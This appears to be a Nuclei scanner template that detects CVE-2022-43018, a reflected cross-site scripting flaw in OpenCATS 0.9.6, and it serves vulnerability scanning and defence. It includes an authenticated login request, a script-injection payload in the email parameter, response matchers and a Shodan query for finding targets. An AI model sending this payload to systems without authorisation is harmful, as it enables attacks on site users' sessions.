http:
- host-redirects: true
  matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>:0
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  raw:
  - 'POST /index.php?m=login&a=attemptLogin HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&password={{password}}

    '
  - 'GET /index.php?m=toolbar&callback=abcd&a=checkEmailIsInSystem&email=</script><script>alert(document.domain)</script>
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-43018
info:
  author: arafatansari
  classification:
    cpe: cpe:2.3:a:opencats:opencats:0.9.6:*:*:*:*:*:*:*
    cve-id: CVE-2022-43018
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.40565
    epss-score: 0.00099
  description: 'OpenCATS 0.9.6 contains a cross-site scripting vulnerability via the
    email parameter in the Check Email function. An attacker can inject arbitrary
    script in the browser of an unsuspecting user in the context of the affected site.
    This can allow the attacker to steal cookie-based authentication credentials and
    launch other attacks.

    '
  metadata:
    max-request: 2
    product: opencats
    shodan-query: title:"OpenCATS"
    vendor: opencats
    verified: true
  name: OpenCATS 0.9.6 - Cross-Site Scripting
  reference:
  - https://github.com/hansmach1ne/opencats_zero-days/blob/main/XSS_in_checkEmail.md
  - https://nvd.nist.gov/vuln/detail/CVE-2022-43018
  remediation: 'Upgrade to a patched version of OpenCATS or apply the necessary security
    patches provided by the vendor.

    '
  severity: medium
  tags: cve,cve2022,xss,opencats,authenticated
